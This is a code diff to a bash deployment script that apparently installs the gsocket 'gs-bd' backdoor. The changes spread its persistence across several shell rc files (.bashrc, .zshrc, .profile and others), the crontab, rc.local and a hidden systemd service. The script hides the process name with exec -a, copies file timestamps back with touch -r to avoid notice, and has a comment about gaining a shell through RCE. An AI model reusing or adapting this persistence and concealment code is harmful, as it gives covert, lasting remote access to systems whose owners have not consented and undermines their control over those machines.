@@ -237,14 +237,14 @@ init_vars()
 	# 'killall' however matches gs-bd and on OSX we thus force killall
 	if [[ $OSTYPE == *darwin* ]]; then
 		KL_CMD="killall"
-		KL_CMD_RUNCHK_UARG="-0 -u${USER}"
+		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
 	elif command -v pkill >/dev/null; then
 		KL_CMD="pkill"
-		KL_CMD_RUNCHK_UARG="-0 -U${UID}"
+		KL_CMD_RUNCHK_UARG=("-0" "-U${UID}")
 	elif command -v killall >/dev/null; then
 		KL_CMD="killall"
 		# cygwin's killall needs the name (not the uid)
-		KL_CMD_RUNCHK_UARG="-0 -u${USER}"
+		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
 	fi
 
 	# $PATH might be set differently in crontab/.profile. Use
@@ -268,10 +268,24 @@ init_vars()
 	RCLOCAL_DIR="${GS_PREFIX}/etc"
 	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"
 
-	[[ -z $RC_FILENAME ]] && [[ $SHELL =~ zsh ]] && [[ -f ~/.zshrc ]] && RC_FILENAME=".zshrc"
-	[[ -z $RC_FILENAME ]] && [[ $SHELL =~ bash ]] && [[ -f ~/.bash_profile ]] && RC_FILENAME=".bash_profile"
-	[[ -z $RC_FILENAME ]] && [[ $SHELL =~ bash ]] && [[ -f ~/.bash_login ]] && RC_FILENAME=".bash_login"
-	[[ -z $RC_FILENAME ]] && RC_FILENAME=".profile"
+	# Create a list of potential rc-files.
+	# - .bashrc is often, but not always, included by .bash_profile [IGNORE]
+	# - .bash_login is ignored if .bash_profile exists
+	# - $SHELL might not be set (if /bin/sh was gained by RCE)
+	[[ -f ~/.zshrc ]] && RC_FN_LIST+=(".zshrc")
+	if [[ -f ~/.bashrc ]]; then
+		RC_FN_LIST+=(".bashrc")
+		# Assume .bashrc is loaded by .bash_profile and .profile
+	else
+		# HERE: not bash or .bashrc does not exist
+		if [[ -f ~/.bash_profile ]]; then
+			RC_FN_LIST+=(".bash_profile")
+		elif [[ -f ~/.bash_login ]]; then
+			RC_FN_LIST+=(".bash_login")
+		fi
+	fi
+	[[ -f ~/.profile ]] && RC_FN_LIST+=(".profile")
+	[[ ${#RC_FN_LIST[@]} -eq 0 ]] && RC_FN_LIST+=(".profile")
 
 	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
@@ -286,9 +300,9 @@ init_setup()
 		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
 		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
 		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
-		if [[ -f "${HOME}/${RC_FILENAME}" ]]; then
-			cp -p "${HOME}/${RC_FILENAME}" "${GS_PREFIX}${HOME}/${RC_FILENAME}"
-			touch -r "${HOME}/${RC_FILENAME}" "${GS_PREFIX}${HOME}/${RC_FILENAME}"
+		if [[ -f "${HOME}/${RC_FN_LIST[1]}" ]]; then
+			cp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
+			touch -r "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
 		fi
 		cp -p /etc/rc.local "${GS_PREFIX}/etc/"
 		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
@@ -318,8 +332,8 @@ init_setup()
 	# The best we can do:
 	# 1. If pidof/killall/pkill exist _AND_ daemon is running then do nothing.
 	# 2. Otherwise start gs-bd as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
-	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN})"
-	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\""
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}')"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\""
 
 	# check that xxd is working as expected (alpine linux does not have -r option)
 	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
@@ -394,7 +408,10 @@ uninstall()
 	uninstall_rmdir "${TMPDIR}"
 
 	# Remove from login script
+	uninstall_rc "${GS_PREFIX}${HOME}/.bash_profile"
+	uninstall_rc "${GS_PREFIX}${HOME}/.bash_login"
 	uninstall_rc "${GS_PREFIX}${HOME}/.bashrc"
+	uninstall_rc "${GS_PREFIX}${HOME}/.zshrc"
 	uninstall_rc "${GS_PREFIX}${HOME}/.profile"
 	uninstall_rc "${GS_PREFIX}/etc/rc.local"
 
@@ -513,7 +530,7 @@ Type=simple
 Restart=always
 RestartSec=10
 WorkingDirectory=/root
-ExecStart=/bin/bash -c \"GSOCKET_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\"
+ExecStart=/bin/bash -c \"GSOCKET_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
 
 [Install]
 WantedBy=multi-user.target" >"${SERVICE_FILE}"
@@ -578,7 +595,7 @@ install_system()
 
 	[[ -z "$IS_INSTALLED" ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }
 
-	[[ -n IS_SKIPPED ]] && return
+	[[ -n $IS_SKIPPED ]] && return
 	
 	OK_OUT
 }
@@ -609,8 +626,11 @@ install_user_profile()
 {
 	local rc_filename_status
 	local rc_file
-	rc_filename_status="${RC_FILENAME}................................"
-	rc_file="${GS_PREFIX}${HOME}/${RC_FILENAME}"
+	local rc_filename
+
+	rc_filename="$1"
+	rc_filename_status="${rc_filename}................................"
+	rc_file="${GS_PREFIX}${HOME}/${rc_filename}"
 
 	echo -en 2>&1 "Installing access via ~/${rc_filename_status:0:15}..............................."
 	[[ -f "${rc_file}" ]] || { touch "${rc_file}"; chmod 600 "${rc_file}"; }
@@ -635,9 +655,11 @@ install_user()
 	fi
 
 	# install_user_profile
-	install_user_profile
+	for x in "${RC_FN_LIST[@]}"; do
+		install_user_profile "$x"
+	done
 
-	[[ -z "$IS_SKIPPED" ]] && gs_secret_write "$USER_SEC_FILE" # Create new secret file
+	gs_secret_write "$USER_SEC_FILE" # Create new secret file
 }
 
 ask_nocertcheck()
@@ -803,7 +825,7 @@ test_network()
 	# 2. Exit=202 after n seconds. Firewalled/DNS?
 	# 3. Exit=203 if TCP to GSRN is refused.
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GSOCKET_ARGS="-s ${GS_SECRET}" exec -a '$PROC_HIDDEN_NAME' "${DSTBIN}" 2>&1)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GSOCKET_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
@@ -945,7 +967,7 @@ gs_start()
 	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
 	# Now two gs-bd's are running (which is correct)
 	if [[ -n "$KL_CMD" ]]; then
-		${KL_CMD} $KL_CMD_RUNCHK_UARG "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+		${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
 	elif command -v pidof >/dev/null; then
 		# if no pkill/killall then try pidof (but we cant tell which user...)
 		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
@@ -974,7 +996,7 @@ gs_start()
 	fi
 
 	if [[ -n "$IS_NEED_START" ]]; then
-		(TERM=xterm-256color GSOCKET_ARGS="-s $GS_SECRET -liD" exec -a '$PROC_HIDDEN_NAME' "$DSTBIN")
+		(TERM=xterm-256color GSOCKET_ARGS="-s $GS_SECRET -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN")
 		IS_GS_RUNNING=1
 	fi
 }
